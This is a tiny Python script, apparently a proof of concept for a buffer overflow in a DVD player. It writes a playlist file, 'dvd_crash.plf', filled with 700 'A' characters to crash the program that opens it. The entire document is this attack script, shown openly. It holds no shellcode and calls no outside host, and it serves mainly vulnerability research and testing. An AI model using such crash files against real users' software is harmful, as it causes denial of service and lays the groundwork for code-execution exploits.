#!/usr/bin/python

file = open("dvd_crash.plf", "wb")

buffer = "A"*700

file.write(buffer)

file.close()